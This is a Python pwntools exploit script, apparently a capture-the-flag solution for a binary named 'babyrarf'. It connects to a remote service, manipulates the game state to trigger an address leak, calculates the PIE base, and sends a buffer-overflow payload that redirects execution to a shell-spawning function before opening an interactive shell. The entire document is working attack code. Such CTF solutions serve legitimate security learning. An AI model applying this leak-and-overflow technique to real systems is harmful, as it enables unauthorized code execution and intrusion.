import pwn
import re

# pwn.context.log_level = "debug"

io = pwn.remote("35.204.144.114", 1337)
# io = pwn.remote("localhost", 8000)
# io = pwn.process("babyrarf")
pwn.context.binary = elf = pwn.ELF('./babyrarf')

# pwn.gdb.attach(
#     io,
#     gdbscript="""break *(&main+479)"""
# )

io.sendlineafter("name?", "idiot")
io.clean(timeout=0.1)

# Get to zero points
score = 9  # Needs to be 9 on CTF server, idk why
# score = 10
while score != 0:
    io.sendline("0")
    s = io.recvuntilS("cr0wn")
    if "lost" in s:
        score -= 1
    elif "won" in s:
        score += 1

# Trigger the bug to get a leak

io.sendline("4")
s = io.recvuntilS("l0zers don't get cr0wns\n")
io.recvlineS()

a = io.recvlineS().split()[-1]
a = int(a)
print(hex(a))

b = io.recvlineS().split()[-2]
b = int(b)
print(hex(b))

# Get addr for shell
csu_elf = elf.sym["__libc_csu_init"]
csu = a
pie_base = csu - csu_elf
get_shell = pie_base + elf.sym["get_shell"]

# End the game to get the the final fgets
print("---")
while True:
    s = io.recvregexS("(cr0wn)|(winner)")
    if "winner" in s:
        break
    io.sendline("3")

# io.sendline(pwn.cyclic(48))
n = pwn.cyclic_find("kaaa")
payload = b"A" * n
payload += pwn.p64(get_shell)
io.send(payload)

io.interactive()
